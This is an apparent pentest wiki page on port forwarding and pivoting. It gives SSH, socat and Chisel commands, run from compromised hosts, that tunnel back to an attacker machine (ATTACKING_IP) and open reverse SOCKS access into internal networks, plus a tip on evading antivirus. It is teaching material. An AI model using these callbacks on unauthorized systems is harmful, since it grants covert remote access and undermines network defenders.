---
description: MITRE ATT&CK™ Protocol Tunneling  - ID T1572 
---
# Port Forwarding

## Theory
Port Forwarding, consist of using any compromised host as a jump box to pivot to other hosts. It is expected that some machines will have more network permissions than others.

## Practice
### SSH tunneling
SSH port forwarding is a mechanism in SSH for tunneling application ports from the client machine to the server machine, or vice versa.  
Since we'll be making a connection back to our attacker's machine, we'll want to create a user in it without access to any console for tunnelling and set a password to use for creating the tunnels:  

```bash
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```
{% tabs %}
{% tab title="SSH Local-Forwarding" %}
**Local port forwarding** is used to **forward a port from the client machine to the server machine**. Basically, the SSH client listens for connections on a configured port, and when it receives a connection, it tunnels the connection to an SSH server. The server connects to a configurated destination port, possibly on a different machine than the SSH server.  
  
This example opens a connection to the jump-server.net, and forwards any connection to port 80 on the local machine to port 80 on intra.example.com.
```bash
veresk@kali$ ssh -L *:80:intra.example.com:80 user@jump-server.net -fN
```
{% endtab %}

{% tab title="SSH Remote-Forwarding" %}
**Remote port forwarding** allows a client machine of an SSH connection to redirect one of its ports to a port on the server, or to redirect a port of a network machine from the SSH server to a port local to the server.  
  
On a compromised computer (jump-server), we can connect back to the attackbox with a reverse port forward using the following command, this example produce the same result as previously seen with Local-Forwarding. Any connection on `ATTACKING_IP:8000` will be redirected on `intra.example.com:80`

```bash
PC> ssh -R 8000:intra.example.com:80 tunneluser@ATTACKING_IP -fN
```

In newer versions of the SSH client, it is also possible to create a **reverse proxy** (the equivalent of the `-D` switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it: 
```bash
PC> ssh -R 9090 tunneluser@ATTACKING_IP -fN
```
{% endtab %}
{% endtabs %}

### SOCAT
We can use static binaries of socat to pivot, they are easy to find for both Linux and Windows. 
{% hint style="danger" %}
Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required.
{% endhint %} 

{% tabs %}
{% tab title="Forward" %}
The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. 
```bash
PC> ./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
```
{% endtab %}

{% tab title="Reverse" %}
First of all, on our own attacking machine, we issue the following command:
```bash
v4resk@kali$ ./socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
```
Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:
```bash
PC> ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```
Now throught `localhost:8000` we can access `172.16.0.10:80`
```bash
#Example
PC> ./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &
```
{% endtab %}
{% endtabs %}


### CHISEL
[Chisel](https://github.com/jpillora/chisel) is an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not. It's written in Golang and can be easily compiled for any system (with static release binaries for Linux and Windows provided).  

{% tabs %}
{% tab title="Reverse Proxy" %}
We can do a Reverse Proxy with Chisel. This connects back from a compromised server to a listener waiting on our attacking machine: 
```bash
v4resk@kali$ ./chisel server -p LISTEN_PORT --reverse &
```
On the compromised host, we would use the following command:
```bash
www-data@pwned.lab$ ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
```
{% endtab %}
{% tab title="Forward Proxy" %}
We can do a Forward Proxy with Chisel
```bash
v4resk@kali$ ./chisel client TARGET_IP:LISTEN_PORT LOCAL_PROXY_PORT:socks
```
On the compromised host, we would use the following command:
```bash
www-data@pwned.lab$ ./chisel server -p LISTEN_PORT --socks5
```
{% endtab %}
{% tab title="ProxyChain" %}
A little reminder on how to use the proxy with ProxyChain. To use it you just have to add the following line to `/etc/proxychains.conf`:
```bash
socks5 127.0.0.1 1080
```

{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://attack.mitre.org/techniques/T1572/" %}
{% embed url="https://podalirius.net/en/articles/ssh-port-forwarding/" %}
{% embed url="https://tryhackme.com/room/wreath"%}



